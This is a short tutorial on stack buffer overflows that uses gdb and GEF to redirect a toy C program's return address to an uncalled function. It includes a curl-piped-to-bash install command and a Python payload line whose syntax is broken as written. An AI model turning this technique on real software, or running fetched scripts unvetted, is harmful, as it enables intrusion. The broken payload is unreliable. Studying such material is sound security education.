# Executing malicious code with buffer overflows

![Call Stack](https://upload.wikimedia.org/wikipedia/commons/thumb/d/d3/Call_stack_layout.svg/342px-Call_stack_layout.svg.png)

Whenever you call a function, you add a "stack frame" onto the stack memory
which contains information about the function's local variables, its parameters,
and more importantly its return address.

Programs have something called an "instruction pointer" which points to the area
in memory the current instruction being executed is located.

Whenever a function returns, the stack frame is popped off the call stack and
the instruction pointer is set to the return address.

If we were somehow able to somehow overwrite this return address, it could be
possible for us to manipulate the program to execute a function that wasn't
meant to be executed, or even execute code that we ourselves inject into the
program's memory.

# Using gdb to perform a simple buffer overflow attack

We will be trying to attack a very simple c program (source code can be found in simple/main.c)

```c
#include <stdio.h>

void hello() {
    printf("Hello\n");
}

int main() {
    char buf[20];
    gets(buf);
}
```
In this attack, we will make the function print hello even though the hello() function is not called in main().

1. Install gdb add-on  
  ``` bash -c "$(curl -fsSL http://gef.blah.cat/sh)"```
2. Start gdb  
   ``` $gdb```  
3. Try to run the executable in gdb    
   ```> file <exec> ```   
   so that the executable is added to gdb.  
   ```> run <exec>```   
   runs the executable in gdb.
4. Try to find the length of the buffer so we know where we should start putting useful information 
   - ```> pattern create -n 8 <length>``` Generate a long string. (-n 8 because 64-bit)
   - Run the program and copy the long string generated by pattern create into the input field.
The output would look something like this:   
<img width="1007" alt="170105430-24c638c2-20a2-4a37-a939-e419e12d2320" src="https://user-images.githubusercontent.com/64151468/170338811-4d7678eb-e010-49b7-aef4-1ebbc41b0ff6.png">
    - The boxed portion ($rbp) would be able to tell us how much did we overwrite the buffer. We can also use ```x $rbp ``` to look up this number.
5. Look up the size of the buffer  
   ```
   > pattern offset <rbp_value>
   ```
6. Find the address of hello() function so we can put it at the end of the buffer.  
    ``` 
    info functions 
    
    ```
    <img width="410" alt="Screen Shot 2022-05-24 at 3 24 21 PM" src="https://user-images.githubusercontent.com/64151468/170339491-36dc6544-b5e4-42b0-b712-420315696880.png">

7. Exit out of gdb with Ctrl+D. Use python to input what we want into the program in bash

```
$ python -c "print(A * <offset> + 8 + <address of function in correct endian>)" | ./<exec>"

```
